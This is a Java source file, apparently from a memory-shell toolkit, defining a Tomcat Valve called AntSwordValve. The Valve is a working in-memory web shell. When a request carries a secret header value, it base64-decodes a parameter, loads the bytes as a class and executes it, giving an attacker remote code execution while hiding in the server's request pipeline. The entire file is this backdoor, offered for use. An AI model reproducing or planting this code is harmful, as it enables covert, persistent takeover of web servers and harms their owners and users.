package com.reajason.javaweb.memshell.shelltool.antsword;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import java.io.IOException;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordValve extends ClassLoader implements Valve {
    public static String pass;
    public static String headerName;
    public static String headerValue;
    protected Valve next;
    protected boolean asyncSupported;

    public AntSwordValve() {
    }

    public AntSwordValve(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = (new AntSwordValve(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(new Object[]{request, response});
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        this.getNext().invoke(request, response);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }
}
